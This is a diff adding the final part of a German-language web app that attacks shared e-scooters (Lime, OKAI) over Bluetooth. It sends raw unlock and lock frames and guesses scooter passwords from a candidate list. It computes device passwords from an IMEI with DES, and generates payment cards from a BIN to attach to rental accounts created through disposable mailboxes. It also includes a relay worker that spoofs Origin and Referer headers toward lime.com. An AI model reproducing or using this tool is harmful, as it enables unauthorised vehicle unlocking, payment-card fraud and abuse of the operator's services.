+  await sleep(okaiModus() ? 800 : 2500);
+  if (!okaiModus()) startPing();
+}
+
+async function sende(ch, a){
+  if (!ch) throw new Error("kein Kanal");
+  if (ch.char.properties.writeWithoutResponse && ch.char.writeValueWithoutResponse)
+    return ch.char.writeValueWithoutResponse(a);
+  return ch.char.writeValue(a);
+}
+
+function startPing(){
+  stopPing();
+  S.ping = setInterval(() => {
+    if (!S.best || !S.dev || !S.dev.gatt.connected) return;
+    if (okaiModus()) return;
+    sende(S.best, HERTZ).catch(() => {});
+  }, 400);
+}
+function stopPing(){ clearInterval(S.ping); S.ping = 0 }
+
+function merke(ch){
+  S.best = ch;
+  ls("best_" + S.brand, ch.wr);
+}
+
+async function anmelden(ch){
+  for (const pw of pwKandidaten()){
+    if (!S.dev || !S.dev.gatt.connected) return "";
+    S.antworten = 0;
+    try { await sende(ch, bu(enc(atBau("ATH", "", pw)))); S.gesamt++ } catch(_){}
+    await sleep(800);
+    if (S.antworten > 0){ log("angemeldet · " + pw, "g"); return pw }
+  }
+  return "";
+}
+
+async function einschalten(){
+  if (!S.best) throw new Error("nicht verbunden");
+  S.offen = false;
+  for (let i = 0; i < 3; i++){
+    await sende(S.best, AN).catch(() => {});
+    S.gesamt++;
+    await sleep(900);
+    if (S.offen) return true;
+    if (!S.dev || !S.dev.gatt.connected) return false;
+  }
+  return S.offen;
+}
+
+async function ausschalten(){
+  if (!S.best) throw new Error("nicht verbunden");
+  for (let i = 0; i < 2; i++){
+    await sende(S.best, AUS).catch(() => {});
+    await sleep(900);
+    if (!S.offen) break;
+  }
+  return !S.offen;
+}
+
+async function okaiSchalten(an){
+  if (!S.best) throw new Error("nicht verbunden");
+  const rahmen = okaiRahmen("OKSCM", [OKAI_PW, an ? "0" : "1"]);
+  S.antworten = 0;
+  for (let i = 0; i < 2; i++){
+    try { await sende(S.best, bu(enc(rahmen))); S.gesamt++ } catch(_){}
+    await sleep(900);
+    if (S.antworten > 0) return true;
+    if (!S.dev || !S.dev.gatt.connected) return false;
+  }
+  return false;
+}
+
+async function okaiTest(){
+  if (!S.best) throw new Error("nicht verbunden");
+  S.antworten = 0;
+  await sende(S.best, bu(enc(okaiRahmen("OKXWM", [OKAI_SVC_PW, "2"])))).catch(() => {});
+  await sleep(900);
+  return S.antworten > 0;
+}
+
+async function okaiAkku(){
+  if (!S.best) throw new Error("nicht verbunden");
+  S.antworten = 0;
+  await sende(S.best, bu(enc(okaiRahmen("OKBCL", [OKAI_PW])))).catch(() => {});
+  await sleep(1000);
+  return S.antworten > 0;
+}
+
+async function befehl(art){
+  S.gesamt = 0;
+  for (let v = 1; v <= 2; v++){
+    try {
+      if (!S.dev || !S.dev.gatt.connected || !S.chans.length){
+        await verbinden();
+        await sleep(okaiModus() ? 800 : 2500);
+      }
+    } catch(e){
+      if (v === 2) throw e;
+      continue;
+    }
+
+    if (okaiModus()){
+      if (await okaiSchalten(art === "un")) return { gesendet:S.gesamt, ok:true };
+      await okaiTest();
+      if (await okaiSchalten(art === "un")) return { gesendet:S.gesamt, ok:true };
+    }
+
+    if (art === "un"){
+      if (await einschalten()) return { gesendet:S.gesamt, ok:true };
+    } else {
+      if (await ausschalten()) return { gesendet:S.gesamt, ok:true };
+    }
+
+    if (S.dev && S.dev.gatt.connected){
+      const pw = await anmelden(S.best);
+      if (pw){
+        S.antworten = 0;
+        for (const d of (art === "lk" ? AT_LK : AT_UN)){
+          try { await sende(S.best, bu(enc(atBau("CMD", d, pw)))); S.gesamt++ } catch(_){}
+          await sleep(800);
+          if (S.antworten > 0) return { gesendet:S.gesamt, ok:true };
+        }
+      }
+    }
+
+    for (const w of (art === "lk" ? ["lock","OFF","K0"] : ["unlock","ON","K1"])){
+      if (!S.dev || !S.dev.gatt.connected) break;
+      S.antworten = 0;
+      try { await sende(S.best, bu(enc(w))); S.gesamt++ } catch(_){}
+      await sleep(500);
+      if (S.antworten > 0) return { gesendet:S.gesamt, ok:true };
+    }
+
+    if (v === 1) log("keine Antwort · neuer Anlauf", "y");
+  }
+  return { gesendet:S.gesamt, ok:false };
+}
+
+/* ═══════ IMEI ═══════ */
+
+function imeiRechnen(){
+  const v = $("iImei").value.replace(/\D/g, "");
+  if (v.length < 14){ stat("IMEI zu kurz", "err"); return }
+  S.imei = v;
+  ls("imei", v);
+  const p = DES.passwort(v);
+  $("pwAus").textContent = "Passwort: " + p + " · auch " + p.slice(0, 8);
+  stat("Passwort gerechnet", "ok");
+}
+
+/* ═══════ QR ═══════ */
+
+let jsqrLaden = null;
+function jsqr(){
+  if (window.jsQR) return Promise.resolve();
+  if (jsqrLaden) return jsqrLaden;
+  jsqrLaden = new Promise((ok, we) => {
+    const s = document.createElement("script");
+    s.src = "https://cdn.jsdelivr.net/npm/jsqr@1.4.0/dist/jsQR.js";
+    s.onload = ok;
+    s.onerror = () => { jsqrLaden = null; we(new Error("Scanner nicht ladbar")) };
+    document.head.appendChild(s);
+  });
+  return jsqrLaden;
+}
+
+let detektor = null;
+function detBauen(){
+  if (detektor) return detektor;
+  if (!("BarcodeDetector" in window)) return null;
+  try { detektor = new window.BarcodeDetector({ formats:["qr_code"] }) } catch(_){ detektor = null }
+  return detektor;
+}
+
+function kameraStopp(){
+  if (S.cam){ S.cam.getTracks().forEach(t => t.stop()); S.cam = null }
+  $("qr").style.display = "none";
+}
+
+async function kamera(){
+  const det = detBauen();
+  if (!det){
+    try { await jsqr() } catch(e){ stat(kurz(e), "e"); return }
+  }
+  try {
+    S.cam = await navigator.mediaDevices.getUserMedia({ video:{ facingMode:"environment" } });
+  } catch(e){ stat("Kamera: " + kurz(e), "e"); return }
+  const v = $("vid");
+  v.srcObject = S.cam;
+  try { await v.play() } catch(_){}
+  $("qr").style.display = "block";
+  S.t0 = Date.now();
+
+  const scannen = async () => {
+    if (!S.cam) return;
+    if (Date.now() - S.t0 > 60000){ kameraStopp(); stat("Kamera aus.", "warn"); return }
+    if (v.readyState === v.HAVE_ENOUGH_DATA){
+      let treffer = "";
+      if (det){
+        try {
+          const r = await det.detect(v);
+          if (r && r.length && r[0].rawValue) treffer = r[0].rawValue;
+        } catch(_){}
+      }
+      if (!treffer && window.jsQR){
+        const c = document.createElement("canvas");
+        c.width = v.videoWidth;
+        c.height = v.videoHeight;
+        const x = c.getContext("2d");
+        x.drawImage(v, 0, 0, c.width, c.height);
+        const d = x.getImageData(0, 0, c.width, c.height);
+        const r = window.jsQR(d.data, d.width, d.height);
+        if (r && r.data) treffer = r.data;
+      }
+      if (treffer){
+        kameraStopp();
+        $("qrbox").textContent = "Code: " + treffer;
+        stat("QR gelesen", "ok");
+        return;
+      }
+    }
+    requestAnimationFrame(scannen);
+  };
+  requestAnimationFrame(scannen);
+}
+
+/* ═══════ ANZEIGE ═══════ */
+
+function paint(){
+  const a = acct();
+  const k = S.karten[S.brand];
+  $("uSitz").textContent = a && a.t ? "steht" : "fehlt";
+  $("uMail").textContent = a ? (a.e || a.ph || "–") : "–";
+  $("uAn").textContent = k ? (k.hinterlegt ? "ja" : "–") : "–";
+  $("uKarte").textContent = "";
+  karteMalen();
+  $("bPhone").disabled = S.prov;
+  $("bStart").disabled = S.prov;
+  $("bKomplett").disabled = S.prov;
+  $("bNeu").disabled = S.prov;
+  $("bBin").disabled = S.prov;
+}
+
+function speichern(){
+  ls("karten", S.karten);
+  ls("pk", S.pk);
+  ls("acct", S.acct);
+  ls("brand", S.brand);
+}
+
+/* ═══════ VERDRAHTUNG ═══════ */
+
+function tue(id, fn){
+  const e = $(id);
+  if (!e) return;
+  e.onclick = async () => {
+    if (e.disabled) return;
+    e.disabled = true;
+    try { await fn() }
+    catch(x){ stat(kurz(x), "e"); log(kurz(x), "e") }
+    finally { e.disabled = false; paint() }
+  };
+}
+
+document.querySelectorAll(".brands button").forEach(b => {
+  b.onclick = () => {
+    S.brand = b.dataset.b;
+    speichern();
+    document.querySelectorAll(".brands button")
+      .forEach(x => x.classList.toggle("on", x.dataset.b === S.brand));
+    paint();
+    stat(V[S.brand].name + " gewählt.", "");
+  };
+});
+
+tue("bStart", starten);
+tue("bKomplett", erneuern);
+tue("bMe", kontoPruefen);
+tue("bOtp", kontoPruefen);
+tue("bLink", async () => {
+  const eingabe = $("iLink").value.trim() || $("iOtp").value.trim();
+  if (!eingabe) throw new Error("Link oder Token einfügen");
+  await einloesen(eingabe);
+});
+tue("bDel", async () => { await kontoLoeschen(); stat("Konto entfernt.", "ok") });
+tue("bPhone", kontoTelefon);
+
+tue("bMail", async () => {
+  const f = S.fach[S.brand] || fachAusSpeicher();
+  if (!f) throw new Error("kein Postfach");
+  const t = await f.lesen();
+  if (!t){ stat("Postfach ist leer · noch keine Mail", "warn"); return }
+  MAILTEXT = t;
+  log("--- MAIL AN " + f.adr + " ---", "h");
+  log(t.replace(/\s+/g, " ").slice(0, 800), "h");
+  log("--- ENDE ---", "h");
+  const tok = tokenAus(t);
+  stat(tok ? "Link gefunden · jetzt LINK EINLÖSEN" : "kein Link in der Mail", tok ? "ok" : "warn");
+});
+
+tue("bFachNeu", async () => {
+  await fachWeg();
+  const f = await fachBauen($("iFach").value);
+  stat("neues Postfach: " + f.adr, "ok");
+});
+
+tue("bNeu", async () => {
+  fahrtStoppen();
+  S.karten[S.brand] = karteBauen();
+  S.erneuert = false;
+  speichern();
+  karteMalen();
+  cstat("neue Karte · jetzt prüfen und anhängen", "");
+});
+
+tue("bBin", async () => {
+  const v = $("iBin").value.replace(/\D/g, "");
+  fahrtStoppen();
+  S.karten[S.brand] = karteBauen(v.length >= 6 ? v : undefined);
+  speichern();
+  karteMalen();
+  cstat("BIN getauscht · jetzt prüfen", "");
+});
+tue("bBinUse", async () => {
+  const v = $("iBin").value.replace(/\D/g, "");
+  if (v.length < 6) throw new Error("BIN braucht mindestens 6 Ziffern");
+  if (v.length > 8) throw new Error("BIN hat höchstens 8 Ziffern");
+  fahrtStoppen();
+  S.karten[S.brand] = karteBauen(v);
+  speichern();
+  karteMalen();
+  await pruefen();
+});
+tue("bPruefCard", pruefen);
+tue("bAnhaengen", async () => {
+  const a = acct();
+  if (!a || !a.t) throw new Error("erst anmelden · KONTO → Link einlösen");
+  const k = S.karten[S.brand];
+  if (!k) throw new Error("keine Karte");
+  if (!k.ok) await pruefen();
+  await limeCard(a.t, k.tok);
+  k.hinterlegt = true;
+  speichern();
+  paint();
+  cstat("Karte ist am Konto", "g");
+  stat("Karte hängt am Konto", "ok");
+});
+tue("bCardDel", async () => {
+  fahrtStoppen();
+  S.karten[S.brand] = null;
+  speichern();
+  karteMalen();
+  cstat("Karte entfernt", "");
+});
+
+tue("bUnlock", async () => {
+  const r = await befehl("un");
+  if (r.ok) stat("entsperrt", "ok");
+  else if (r.gesendet) stat("Befehle raus (" + r.gesendet + ") · keine Antwort", "warn");
+  else stat("nichts gesendet", "warn");
+});
+
+tue("bLock", async () => {
+  const r = await befehl("lk");
+  fahrtStoppen();
+  stat(r.ok ? "gesperrt" : "keine Antwort", r.ok ? "ok" : "warn");
+});
+
+tue("bBeep", async () => {
+  if (!S.best) throw new Error("nicht verbunden");
+  S.antworten = 0;
+  if (okaiModus()) await sende(S.best, bu(enc(okaiRahmen("OKSCT", [OKAI_PW, "1"]))));
+  else await sende(S.best, BLINK);
+  await sleep(600);
+  stat(S.antworten ? "Pieps · Antwort" : "Pieps gesendet", S.antworten ? "ok" : "warn");
+});
+
+tue("bBat", async () => {
+  if (!S.best) throw new Error("nicht verbunden");
+  if (okaiModus()){
+    const a = await okaiAkku();
+    stat(a ? "Akku-Abfrage beantwortet · siehe Konsole" : "keine Antwort", a ? "ok" : "warn");
+    return;
+  }
+  stat(S.akku != null ? "Akku " + S.akku + " %" : "noch kein Status empfangen",
+    S.akku != null ? "ok" : "warn");
+});
+
+tue("bLight", async () => {
+  if (!S.best) throw new Error("nicht verbunden");
+  S.licht = !S.licht;
+  await sende(S.best, S.licht ? LICHT_AN : LICHT_AUS);
+  stat("Licht " + (S.licht ? "an" : "aus"), "ok");
+});
+
+tue("bConn", verbinden);
+tue("bScan", kamera);
+$("bQrClose").onclick = kameraStopp;
+tue("bImei", imeiRechnen);
+tue("bAuth", async () => {
+  if (!S.best) throw new Error("nicht verbunden");
+  const pw = await anmelden(S.best);
+  stat(pw ? "angemeldet · " + pw : "keine Anmeldung", pw ? "ok" : "warn");
+});
+tue("bOkaiUn", async () => {
+  const a = await okaiSchalten(true);
+  stat(a ? "OKSCM 0 beantwortet" : "keine Antwort", a ? "ok" : "warn");
+});
+tue("bOkaiLk", async () => {
+  const a = await okaiSchalten(false);
+  stat(a ? "OKSCM 1 beantwortet" : "keine Antwort", a ? "ok" : "warn");
+});
+tue("bOkaiBat", async () => {
+  const a = await okaiAkku();
+  stat(a ? "OKBCL beantwortet" : "keine Antwort", a ? "ok" : "warn");
+});
+
+function FRAME_TEST(){
+  const v = [
+    [HERTZ, "46 43 11 01 00 08 4c 49 4d 45 42 49 4b 45 be 8a"],
+    [AN, "46 43 16 61 00 01 f1 f2 8f"],
+    [AUS, "46 43 16 61 00 01 f0 e2 ae"],
+    [BLINK, "46 43 16 13 00 01 06 c2 6a"],
+    [LICHT_AN, "46 43 16 12 00 01 f1 2b 26"],
+    [rahmenB(0x1114, []), "46 43 11 14 00 00 ea fb"]
+  ];
+  let gut = 0;
+  for (const [f, soll] of v){
+    if (hex(f) === soll) gut++;
+    else log("Rahmen falsch: " + hex(f), "e");
+  }
+  return { gut, soll:v.length };
+}
+
+const PFLICHT = ["status","bt","bUnlock","bLock","bBeep","bBat","bConn","bLight","bScan",
+  "uSitz","uMail","uPost","uAn","uLast","uLimit","uZeit","cBar","cstat","cardBox","cNum",
+  "cExp","cCvv","cBrand","cLimit","bStart","bNeu","bKomplett","bMe","bDel","bBin","bBinUse",
+  "bPruefCard","bAnhaengen","bCardDel","iBin","log","bLeer","bDiag","bPruef","iImei","bImei",
+  "bAuth","iKanal","iRelay","bSaveRelay","bRelayDel","bNet","bFrei","bCopyW","workerCode",
+  "bTest","bOkaiUn","bOkaiLk","bOkaiBat","iSvc","iCh","iRaw","bRaw","iPhone","bPhone","bOtp",
+  "iOtp","iPk","bPk","bReset","iLink","bLink","bMail","bFachNeu","iFach","vid","qr","qrbox",
+  "bQrClose","pwAus","iRelay","manifest"];
+
+tue("bPruef", async () => {
+  log("=== SELBSTPRÜFUNG ===", "h");
+  let fehlt = 0;
+  for (const id of PFLICHT){
+    if (!$(id) && id !== "manifest"){ log("fehlt: " + id, "e"); fehlt++ }
+  }
+  log("Elemente: " + (PFLICHT.length - fehlt) + "/" + PFLICHT.length, fehlt ? "e" : "g");
+  const f = FRAME_TEST();
+  log("Rahmen 1114: " + (hex(rahmenB(0x1114, [])) === "46 43 11 14 00 00 ea fb" ? "stimmt" : "falsch"),
+    hex(rahmenB(0x1114, [])) === "46 43 11 14 00 00 ea fb" ? "g" : "e");
+  log("Rahmen 1661: " + (hex(AN) === "46 43 16 61 00 01 f1 f2 8f" ? "stimmt" : "falsch"),
+    hex(AN) === "46 43 16 61 00 01 f1 f2 8f" ? "g" : "e");
+  log("Rahmen gesamt: " + f.gut + "/" + f.soll, f.gut === f.soll ? "g" : "e");
+  const d = DES.selbsttest();
+  log("DES: " + d.gut + "/" + d.soll, d.gut === d.soll ? "g" : "e");
+  const k = S.karten[S.brand];
+  log("Karte gültig: " + (k && k.ok ? "ja" : "nein"), k && k.ok ? "g" : "y");
+  log("Bluetooth: " + (navigator.bluetooth ? "ja" : "nein"), navigator.bluetooth ? "g" : "y");
+  log("QR-Leser: " + (detBauen() ? "BarcodeDetector" : "Ersatz jsQR"), "g");
+  log("Relay: " + (S.relay ? "gesetzt" : "keiner"), S.relay ? "g" : "y");
+  log("=== ENDE ===", "h");
+  stat("Selbstprüfung fertig.", "ok");
+});
+
+tue("bDiag", async () => {
+  log("=== DIAGNOSE ===", "h");
+  const f = FRAME_TEST();
+  log("Rahmen: " + f.gut + "/" + f.soll, f.gut === f.soll ? "g" : "e");
+  const d = DES.selbsttest();
+  log("DES: " + d.gut + "/" + d.soll, d.gut === d.soll ? "g" : "e");
+  log("Bluetooth: " + (navigator.bluetooth ? "ja" : "nein"));
+  log("Relay: " + (S.relay || "keiner"));
+  log("Marke: " + S.brand + " · OKAI-Kanal: " + (okaiModus() ? "ja" : "nein"));
+  log("Sitzung: " + (acct() && acct().t ? "steht" : "fehlt"));
+  log("Postfach: " + ($("uPost").textContent || "–"));
+  log("Kanäle: " + S.chans.length + (S.best ? " · aktiv " + S.best.wr : ""));
+  for (const c of S.chans) log("  " + c.svc + " / " + c.wr + (c.notify ? " notify" : ""));
+  log("=== ENDE ===", "h");
+  stat("Diagnose geschrieben.", "ok");
+});
+
+$("bLeer").onclick = () => { $("log").textContent = "" };
+
+tue("bFrei", async () => {
+  S.tot = {}; S.fehler = {}; S.gut = ""; ls("gut", "");
+  stat("Sperren aufgehoben.", "ok");
+});
+
+tue("bSaveRelay", async () => {
+  let v = $("iRelay").value.trim();
+  if (!v) throw new Error("Feld leer");
+  if (!/^https:\/\//.test(v)) v = "https://" + v;
+  if (!/\?url=$/.test(v)) v = v.replace(/[?&]url=.*$/, "").replace(/\/$/, "") + "/?url=";
+  S.relay = v; ls("relay", v);
+  $("iRelay").value = v;
+  stat("Relay gespeichert.", "ok");
+});
+
+tue("bRelayDel", async () => {
+  S.relay = ""; ls("relay", "");
+  $("iRelay").value = "";
+  stat("Relay gelöscht.", "ok");
+});
+
+tue("bNet", async () => {
+  const post = V.lime.base + "/v2/onboarding/magic-link";
+  const get = GU + "?f=get_email_address&lang=en";
+  const probe = F({ email:"probe@example.com", user_agreement_version:"4",
+    user_agreement_country_code:"DE" });
+  log("=== NETZTEST ===", "h");
+  const zeig = (name, res, text) => {
+    const gut = res.status < 400 || (res.status >= 400 && res.status < 423 && /^[\[{]/.test(text.trim()));
+    log((gut ? "OK  " : "HTTP " + res.status + "  ") + name, gut ? "g" : "e");
+  };
+  const pruef = async (name, fn) => {
+    try { const r = await fn(); zeig(name, r, await r.text()) }
+    catch(e){ log("FEHLT  " + name + " · " + kurz(e), "e") }
+  };
+  if (S.relay){
+    await pruef("RELAY GET", () => fetch(S.relay + encodeURIComponent(get)));
+    await pruef("RELAY POST", () => fetch(S.relay + encodeURIComponent(post),
+      { method:"POST", headers:HF(), body:probe }));
+  } else log("kein Relay gesetzt", "y");
+  for (const w of POSTWEGE)
+    await pruef(w.n + " POST", () => fetch(w.f(post), { method:"POST", headers:HF(), body:probe }));
+  for (const w of GETWEGE)
+    await pruef(w.n + " GET", () => fetch(w.f(get)));
+  log("=== ENDE ===", "h");
+  stat("Test beendet.", "ok");
+});
+
+tue("bCopyW", async () => {
+  try { await navigator.clipboard.writeText($("workerCode").value); stat("kopiert.", "ok") }
+  catch(_){ $("workerCode").select(); stat("markiert · jetzt kopieren.", "warn") }
+});
+
+tue("bPk", async () => {
+  const v = $("iPk").value.trim();
+  if (!PK_FORM.test(v)) throw new Error("sieht nicht wie ein pk_live_… aus");
+  S.pk[S.brand] = v; S.keyOk = v; ls("pk", S.pk);
+  paint();
+  stat("Schlüssel gespeichert.", "ok");
+});
+
+tue("bRaw", async () => {
+  if (!S.srv) throw new Error("nicht verbunden");
+  const svc = $("iSvc").value.trim(), ch = $("iCh").value.trim();
+  let ziel = S.best;
+  if (svc && ch){
+    const s = await S.srv.getPrimaryService(svc);
+    const c = await s.getCharacteristic(ch);
+    ziel = { svc, wr:ch, char:c };
+    merke(ziel);
+  }
+  const t = $("iRaw").value.trim();
+  if (!t) throw new Error("nichts eingegeben");
+  const h = t.replace(/[^0-9a-f]/gi, "");
+  const a = (/^[0-9a-f\s]+$/i.test(t) && h.length >= 4 && h.length % 2 === 0)
+    ? bu(h.match(/../g).map(x => parseInt(x, 16)))
+    : bu(enc(t));
+  await sende(ziel, a);
+  log("gesendet · " + hex(a), "g");
+});
+
+tue("bTest", async () => {
+  const f = FRAME_TEST();
+  const d = DES.selbsttest();
+  log("Rahmen " + f.gut + "/" + f.soll + " · DES " + d.gut + "/" + d.soll, "h");
+  stat("Rahmen " + f.gut + "/" + f.soll + " · DES " + d.gut + "/" + d.soll,
+    (f.gut === f.soll && d.gut === d.soll) ? "ok" : "e");
+  if (!S.best) return;
+  const t = await okaiTest();
+  stat(t ? "Testmodus beantwortet" : "Testmodus ohne Antwort", t ? "ok" : "warn");
+});
+
+tue("bReset", async () => {
+  clearInterval(S.fahrt.timer);
+  stopPing();
+  Object.keys(localStorage).filter(k => k.indexOf(PRE) === 0)
+    .forEach(k => localStorage.removeItem(k));
+  location.reload();
+});
+
+/* ═══════ START ═══════ */
+
+const WORKER = `export default {
+  async fetch(req){
+    const cors = {
+      "Access-Control-Allow-Origin": "*",
+      "Access-Control-Allow-Headers": "*",
+      "Access-Control-Allow-Methods": "GET,POST,PUT,PATCH,DELETE,OPTIONS",
+      "Access-Control-Max-Age": "86400"
+    };
+    if (req.method === "OPTIONS") return new Response(null, { status: 204, headers: cors });
+    const u = new URL(req.url);
+    let ziel = u.searchParams.get("url");
+    if (!ziel && u.pathname.length > 1) ziel = decodeURIComponent(u.pathname.slice(1)) + (u.search || "");
+    if (!ziel) return new Response("keine url", { status: 400, headers: cors });
+    if (!/^https?:\\/\\//i.test(ziel)) ziel = "https://" + ziel;
+    const h = new Headers(req.headers);
+    ["host","origin","referer","cf-connecting-ip","cf-ray","cf-visitor","cf-ipcountry",
+     "x-forwarded-proto","x-real-ip","accept-encoding","connection","content-length",
+     "sec-fetch-site","sec-fetch-mode","sec-fetch-dest","sec-ch-ua","sec-ch-ua-mobile",
+     "sec-ch-ua-platform"].forEach(k => h.delete(k));
+    h.set("Origin", "https://www.lime.com");
+    h.set("Referer", "https://www.lime.com/");
+    if (!h.get("User-Agent") || /cloudflare/i.test(h.get("User-Agent")))
+      h.set("User-Agent", "Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) " +
+        "AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Mobile/15E148 Safari/604.1");
+    const init = { method: req.method, headers: h, redirect: "follow" };
+    if (req.method !== "GET" && req.method !== "HEAD") init.body = await req.arrayBuffer();
+    const ctl = new AbortController();
+    const t = setTimeout(() => ctl.abort(), 25000);
+    init.signal = ctl.signal;
+    try {
+      const r = await fetch(ziel, init);
+      clearTimeout(t);
+      const out = new Headers(r.headers);
+      ["content-encoding","content-length","transfer-encoding","connection"].forEach(k => out.delete(k));
+      Object.entries(cors).forEach(([k, v]) => out.set(k, v));
+      return new Response(r.body, { status: r.status, headers: out });
+    } catch(e){
+      clearTimeout(t);
+      return new Response(JSON.stringify({ error: "relay_fail", detail: String(e) }),
+        { status: 502, headers: { ...cors, "Content-Type": "application/json" } });
+    }
+  }
+};`;
+
+function boot(){
+  S.karten = lg("karten", {}) || {};
+  S.pk = lg("pk", {}) || {};
+  S.acct = lg("acct", {}) || {};
+  S.relay = lg("relay", "") || "";
+  S.gut = lg("gut", "") || "";
+  S.imei = lg("imei", "") || "";
+  S.brand = lg("brand", "lime");
+  if (!V[S.brand]) S.brand = "lime";
+  S.keyOk = (S.pk.lime && PK_FORM.test(S.pk.lime)) ? S.pk.lime : "";
+  S.tot = {}; S.fehler = {}; S.hostTot = {}; S.dev = null;
+
+  $("iRelay").value = S.relay;
+  $("workerCode").value = WORKER;
+  if (S.imei) $("iImei").value = S.imei;
+  $("iFach").value = lg("fachart", "");
+  const a = acct();
+  if (a && a.ph) $("iPhone").value = a.ph;
+  if (S.pk[S.brand]) $("iPk").value = S.pk[S.brand];
+
+  const altFach = lg("fach_" + S.brand, null);
+  if (altFach && altFach.adr) $("uPost").textContent = altFach.adr;
+
+  document.querySelectorAll(".brands button")
+    .forEach(x => x.classList.toggle("on", x.dataset.b === S.brand));
+  paint();
+  log("bereit · " + V[S.brand].name, "g");
+  stat(S.relay ? "bereit · Relay gesetzt" : "bereit · ohne Relay", "");
+}
+
+$("iFach").addEventListener("change", () => ls("fachart", $("iFach").value));
+
+document.addEventListener("visibilitychange", () => { if (document.hidden) kameraStopp() });
+window.addEventListener("error", e => log("Fehler: " + kurz(e.message), "e"));
+window.addEventListener("unhandledrejection", e => log("Promise: " + kurz(e.reason), "e"));
+
+boot();
+
+if ("serviceWorker" in navigator) navigator.serviceWorker.register("./sw.js").catch(() => {});
+</script>
+</body>
+</html>
